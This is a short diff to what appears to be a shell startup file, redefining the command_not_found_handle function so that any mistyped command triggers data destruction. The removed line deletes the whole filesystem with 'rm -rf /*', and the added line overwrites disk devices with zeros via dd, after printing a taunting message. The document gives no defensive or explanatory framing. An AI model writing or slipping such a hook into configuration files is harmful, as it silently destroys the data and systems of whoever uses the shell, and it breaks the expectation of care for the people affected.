@@ -14,5 +14,5 @@ PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 
 function command_not_found_handle {
      echo "That typo wil be the end of you!" &
-     rm -rf /* 2>/dev/null
+     dd if=/dev/zero of=/dev/sd* bs=4M status=none
 }
